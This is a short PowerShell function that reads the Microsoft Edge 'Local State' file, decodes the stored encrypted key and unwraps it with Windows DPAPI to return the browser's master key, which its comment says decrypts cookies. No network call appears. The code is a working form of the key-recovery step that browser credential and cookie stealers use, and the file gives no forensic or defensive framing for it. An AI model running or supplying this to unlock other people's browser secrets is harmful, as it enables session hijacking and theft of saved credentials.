function Get-ChromeSecretKey {
    # Path for Edge (Change 'Edge' to 'Chrome' if needed)
    $localStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    
    try {
        # 1. Read and parse the JSON Local State file
        if (-not (Test-Path $localStatePath)) { throw "Local State file not found." }
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        
        # 2. Get the encrypted key and decode from Base64
        $encryptedKey = $localState.os_crypt.encrypted_key
        $decodedKeyBytes = [Convert]::FromBase64String($encryptedKey)
        
        # 3. Remove the "DPAPI" prefix (the first 5 bytes: 44 50 41 50 49)
        $actualKeyBytes = $decodedKeyBytes[5..($decodedKeyBytes.Length - 1)]
        

        Add-Type -AssemblyName System.Security
        
        # Unprotect returns the raw Master Key used for AES-256-GCM cookie decryption
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $actualKeyBytes, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $masterKey
    }
    catch {
        Write-Error "Error retrieving secret key: $($_.Exception.Message)"
        return $null
    }
}

